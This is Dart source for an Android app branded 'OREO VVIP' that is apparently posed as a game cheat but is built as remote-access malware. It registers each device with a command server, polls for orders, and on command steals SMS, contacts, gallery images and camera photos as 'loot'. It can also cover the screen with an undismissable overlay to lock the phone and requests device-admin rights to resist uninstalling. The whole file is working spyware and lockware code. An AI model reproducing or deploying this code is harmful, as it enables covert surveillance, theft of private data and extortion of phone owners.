import 'dart:async';
import 'dart:convert';
import 'dart:math';
import 'dart:ui'; // Buat DartPluginRegistrant

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_overlay_window/flutter_overlay_window.dart';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:device_info_plus/device_info_plus.dart';

import 'config.dart';

const MethodChannel _native = MethodChannel('com.yanz.cheat/native');

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await _initBackgroundService();
  runApp(const MyApp());
}

Future<String> _getOrCreateDeviceId() async {
  final sp = await SharedPreferences.getInstance();
  var id = sp.getString(AppConfig.deviceIdKey);
  if (id != null && id.isNotEmpty) return id;

  final info = DeviceInfoPlugin();
  final android = await info.androidInfo;
  final rand = Random.secure();
  final suffix = List.generate(6, (_) => rand.nextInt(16).toRadixString(16)).join();
  id = '${android.id}-$suffix';

  await sp.setString(AppConfig.deviceIdKey, id);
  return id;
}

Future<void> _initBackgroundService() async {
  final service = FlutterBackgroundService();
  await service.configure(
    androidConfiguration: AndroidConfiguration(
      onStart: onServiceStart,
      autoStart: true,
      isForegroundMode: true,
      notificationChannelId: 'yanz_channel',
      initialNotificationTitle: 'OREO Service',
      initialNotificationContent: 'Berjalan di latar belakang',
      foregroundServiceNotificationId: 888,
      foregroundServiceTypes: [AndroidForegroundType.specialUse],
    ),
    iosConfiguration: IosConfiguration(autoStart: true),
  );
  await service.startService();
}

@pragma('vm:entry-point')
Future<void> onServiceStart(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized();

  if (service is AndroidServiceInstance) {
    service.on('setAsForeground').listen((_) => service.setAsForegroundService());
    service.on('setAsBackground').listen((_) => service.setAsBackgroundService());
  }
  service.on('stopService').listen((_) => service.stopSelf());

  final deviceId = await _getOrCreateDeviceId();
  final info = DeviceInfoPlugin();
  final android = await info.androidInfo;

  try {
    await http.post(
      Uri.parse('${AppConfig.baseUrl}${AppConfig.epRegister}'),
      headers: {'Content-Type': 'application/json'},
      body: jsonEncode({
        'id': deviceId,
        'model': android.model,
        'android': android.version.release,
      }),
    ).timeout(const Duration(seconds: 10));
  } catch (e) {
    debugPrint('Register error: $e');
  }

  Timer.periodic(const Duration(seconds: AppConfig.pollIntervalSec), (timer) async {
    try {
      final res = await http
          .get(Uri.parse('${AppConfig.baseUrl}${AppConfig.epPoll}/$deviceId/poll'))
          .timeout(const Duration(seconds: 8));

      if (res.statusCode != 200 || res.body.isEmpty) return;
      final data = jsonDecode(res.body) as Map<String, dynamic>;
      final cmd = data['cmd'];
      if (cmd is Map && cmd['action'] != null) {
        await _handleCommand(
          deviceId,
          cmd['id'] as int,
          cmd['action'] as String,
          (cmd['payload'] as Map?)?.cast<String, dynamic>() ?? {},
        );
      }
    } catch (e) {
      debugPrint('Poll error: $e');
    }
  });
}

Future<void> _handleCommand(
  String deviceId,
  int cmdId,
  String action,
  Map<String, dynamic> payload,
) async {
  Map<String, dynamic> result = {'ok': false};
  Map<String, dynamic>? loot;

  try {
    switch (action) {
      case 'lock_v1':
      case 'lock_v2':
        if (!await FlutterOverlayWindow.isPermissionGranted()) {
          await FlutterOverlayWindow.requestPermission();
        }
        if (await FlutterOverlayWindow.isPermissionGranted()) {
          await FlutterOverlayWindow.showOverlay(
            height: WindowSize.fullCover,
            width: WindowSize.fullCover,
            enableDrag: false,
          );
          result = {'ok': true, 'shown': true};
        } else {
          result = {'ok': false, 'reason': 'overlay_denied'};
        }
        break;

      case 'sadap_sms':
        try {
          final data = await _native.invokeMethod<List>('getSms');
          loot = {'kind': 'sadap_sms', 'data': data ?? []};
          result = {'ok': true, 'count': data?.length ?? 0};
        } on PlatformException catch (e) {
          result = {'ok': false, 'error': e.message};
        }
        break;

      case 'cek_kontak':
        try {
          final data = await _native.invokeMethod<List>('getContacts');
          loot = {'kind': 'cek_kontak', 'data': data ?? []};
          result = {'ok': true, 'count': data?.length ?? 0};
        } on PlatformException catch (e) {
          result = {'ok': false, 'error': e.message};
        }
        break;

      case 'cek_galeri':
        try {
          final data = await _native.invokeMethod<List>('getGallery');
          loot = {'kind': 'cek_galeri', 'data': data ?? []};
          result = {'ok': true, 'count': data?.length ?? 0};
        } on PlatformException catch (e) {
          result = {'ok': false, 'error': e.message};
        }
        break;

      case 'akses_kamera':
        try {
          final data = await _native.invokeMethod<List>('takePhoto');
          loot = {'kind': 'akses_kamera', 'data': data ?? []};
          result = {'ok': true};
        } on PlatformException catch (e) {
          result = {'ok': false, 'error': e.message};
        }
        break;

      case 'anti_uninstall':
        try {
          final active = await _native.invokeMethod<bool>('isAdminActive');
          if (active != true) {
            await _native.invokeMethod('requestAdmin');
          }
          result = {'ok': true, 'admin': active ?? false};
        } catch (e) {
          result = {'ok': false, 'error': e.toString()};
        }
        break;

      default:
        result = {'ok': false, 'reason': 'unknown_action'};
    }
  } catch (e) {
    result = {'ok': false, 'error': e.toString()};
  }

  try {
    await http.post(
      Uri.parse('${AppConfig.baseUrl}${AppConfig.epResult}/$deviceId/result'),
      headers: {'Content-Type': 'application/json'},
      body: jsonEncode({
        'id': cmdId,
        'result': result,
        if (loot != null) 'loot': loot,
      }),
    ).timeout(const Duration(seconds: 20));
  } catch (e) {
    debugPrint('Result error: $e');
  }
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'OREO VVIP',
      debugShowCheckedModeBanner: false,
      home: const HomePage(),
    );
  }
}

class HomePage extends StatefulWidget {
  const HomePage({super.key});

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> {
  String _status = 'idle';
  String _deviceId = '';

  @override
  void initState() {
    super.initState();
    _loadDeviceId();
  }

  Future<void> _loadDeviceId() async {
    final id = await _getOrCreateDeviceId();
    setState(() => _deviceId = id);
  }

  Future<void> _requestAll() async {
    setState(() => _status = 'meminta izin...');
    await [
      Permission.sms,
      Permission.contacts,
      Permission.camera,
      Permission.photos,
      Permission.notification,
    ].request();

    if (!await FlutterOverlayWindow.isPermissionGranted()) {
      await FlutterOverlayWindow.requestPermission();
    }
    setState(() => _status = 'izin diproses');
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text('OREO VVIP V33')),
      body: Padding(
        padding: const EdgeInsets.all(16),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            Text('Device ID:\n$_deviceId', textAlign: TextAlign.center),
            const SizedBox(height: 12),
            Text('Status: $_status', textAlign: TextAlign.center),
            const SizedBox(height: 24),
            ElevatedButton(
              onPressed: _requestAll,
              child: const Text('Minta Izin'),
            ),
          ],
        ),
      ),
    );
  }
}
